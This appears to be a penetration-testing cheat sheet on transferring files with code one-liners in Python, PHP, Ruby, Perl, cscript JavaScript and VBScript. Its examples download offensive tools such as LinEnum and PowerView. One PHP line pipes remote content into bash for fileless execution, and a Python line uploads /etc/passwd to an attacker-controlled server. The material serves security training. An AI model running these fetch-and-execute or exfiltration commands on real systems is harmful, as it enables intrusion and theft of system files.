### Transferring Files with Code

```
# Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions 
# but can also be installed on Windows, although this is far less common.
# We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code.

# According to Wikipedia, there are around 700 programming languages, 
# and we can create code in any programing language, to download, upload or execute instructions to the OS. 
```

### Python 

```
# Python 2 - Download

python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Python 3 - Download

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP

```
# In the following example, we will use the PHP file_get_contents() module to download content from a website combined with 
# the file_put_contents() module to save the file into a directory. 
# PHP can be used to run one-liners from an operating system command line using the option -r:

php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# An alternative to file_get_contents() and file_put_contents() is the fopen() module. 
# We can use this module to open a URL, read it's content and save it into a file:

php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# We can also send the downloaded content to a pipe instead, 
# similar to the fileless example we executed in the previous section using cURL and wget:

php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

# Note: 
# The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
```

### Ruby, Perl

```
# Ruby and Perl are other popular languages that can also be used to transfer files. 
# These two programming languages also support running one-liners from an operating system command line using the option -e.

ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript
[post](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)
```
# The following JavaScript code is based on post above, and we can download a file using it. 
# We'll create a file called wget.js and save the following content:

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

# We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBScript

[post](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs)

```
# The following VBScript example can be used based on post above. 
# We'll create a file called wget.vbs and save the following content:

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

# We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Upload Operations using Python3

[requests module](https://pypi.org/project/requests/)
[upload server](https://github.com/Densaugeo/uploadserver)

```
# The Python3 requests module allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. 
# We can use the following code if we want to upload a file to our Python3 uploadserver.

python3 -m uploadserver            # Start upload server on target machine

python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'  # Upload form localhost
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")}, verify=False)' # when self-signed cert
```
